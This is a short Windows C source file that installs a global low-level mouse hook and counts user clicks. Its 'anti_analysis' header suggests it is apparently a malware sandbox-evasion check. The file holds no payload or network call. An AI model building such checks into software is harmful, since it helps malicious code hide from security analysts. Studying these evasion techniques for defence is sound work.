#include "anti_analysis.h"

/* GLOBAL VARIABLES */
// global hook handle variable
HHOOK g_hMouseHook = NULL;
// global mouse clicks counter
DWORD g_dwMouseClicks = 0;

LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    // WM_RBUTTONDOWN :         "Right Mouse Click"
    // WM_LBUTTONDOWN :         "Left Mouse Click"
    // WM_MBUTTONDOWN :         "Middle Mouse Click"

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        DebugPrint("[+] Mouse Click Recorded \n");
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG         Msg = { 0 };

    // installing hook 
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        0
    );
    if (!g_hMouseHook) {
        DebugPrint("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
    }

    // process unhandled events
    while (GetMessageW(&Msg, NULL, 0, 0)) {
		DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}
